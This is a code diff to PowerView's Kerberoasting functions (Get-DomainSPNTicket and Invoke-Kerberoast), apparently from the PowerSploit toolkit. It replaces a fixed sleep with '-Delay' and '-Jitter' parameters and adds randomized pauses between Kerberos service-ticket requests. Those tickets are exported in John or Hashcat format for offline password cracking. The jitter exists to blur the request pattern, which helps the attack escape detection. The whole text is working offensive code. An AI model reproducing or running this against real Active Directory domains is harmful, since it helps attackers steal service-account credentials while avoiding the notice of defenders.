@@ -487,9 +487,13 @@ Defaults to 'John'.
 A [Management.Automation.PSCredential] object of alternate credentials
 for connection to the remote domain using Invoke-UserImpersonation.
 
-.PARAMETER Sleep
+.PARAMETER Delay
 
-Specifies the sleep in seconds between ticket requests.
+Specifies the delay in seconds between ticket requests.
+
+.PARAMETER Jitter
+
+Specifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3
 
 .EXAMPLE
 
@@ -546,10 +550,14 @@ Outputs a custom object containing the SamAccountName, ServicePrincipalName, and
         [Alias('Format')]
         [String]
         $OutputFormat = 'John',
-		
+
         [ValidateRange(0,10000)]
         [Int]
-        $Sleep = 0,
+        $Delay = 0,
+
+        [ValidateRange(0.0, 1.0)]
+        [Double]
+        $Jitter = .3,
 
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
@@ -571,8 +579,11 @@ Outputs a custom object containing the SamAccountName, ServicePrincipalName, and
         else {
             $TargetObject = $SPN
         }
+	
+	$RandNo = New-Object System.Random
 
         ForEach ($Object in $TargetObject) {
+
             if ($PSBoundParameters['User']) {
                 $UserSPN = $Object.ServicePrincipalName
                 $SamAccountName = $Object.SamAccountName
@@ -648,8 +659,10 @@ Outputs a custom object containing the SamAccountName, ServicePrincipalName, and
                 $Out | Add-Member Noteproperty 'ServicePrincipalName' $Ticket.ServicePrincipalName
                 $Out.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')
                 Write-Output $Out
+	    
+            	# sleep for our semi-randomized interval
+            	Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
             }
-            Start-Sleep($Sleep)
         }
     }
 
@@ -1030,8 +1043,6 @@ Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).
 Specifies the PageSize to set for the LDAP searcher object.
 .PARAMETER ServerTimeLimit
 Specifies the maximum amount of time the server spends searching. Default of 120 seconds.
-.PARAMETER Sleep
-Specifies the sleep in seconds between ticket requests.
 .PARAMETER Tombstone
 Switch. Specifies that the searcher should also return deleted/tombstoned objects.
 .PARAMETER OutputFormat
@@ -1040,6 +1051,10 @@ Defaults to 'John'.
 .PARAMETER Credential
 A [Management.Automation.PSCredential] object of alternate credentials
 for connection to the target domain.
+.PARAMETER Delay
+Specifies the delay in seconds between ticket requests.
+.PARAMETER Jitter
+Specifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3
 .EXAMPLE
 Invoke-Kerberoast | fl
 Kerberoasts all found SPNs for the current domain.
@@ -1089,10 +1104,6 @@ Outputs a custom object containing the SamAccountName, ServicePrincipalName, and
         [String]
         $SearchScope = 'Subtree',
 
-        [ValidateRange(0,10000)]
-        [Int]
-        $Sleep = 0,
-		
         [ValidateRange(1, 10000)]
         [Int]
         $ResultPageSize = 200,
@@ -1103,6 +1114,14 @@ Outputs a custom object containing the SamAccountName, ServicePrincipalName, and
 
         [Switch]
         $Tombstone,
+
+        [ValidateRange(0,10000)]
+        [Int]
+        $Delay = 0,
+
+        [ValidateRange(0.0, 1.0)]
+        [Double]
+        $Jitter = .3,
 
         [ValidateSet('John', 'Hashcat')]
         [Alias('Format')]
@@ -1136,7 +1155,7 @@ Outputs a custom object containing the SamAccountName, ServicePrincipalName, and
 
     PROCESS {
         if ($PSBoundParameters['Identity']) { $UserSearcherArguments['Identity'] = $Identity }
-        Get-DomainUser @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'krbtgt'} | Get-DomainSPNTicket -Sleep $Sleep -OutputFormat $OutputFormat
+        Get-DomainUser @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'krbtgt'} | Get-DomainSPNTicket -Delay $Delay -OutputFormat $OutputFormat -Jitter $Jitter
     }
 
     END {
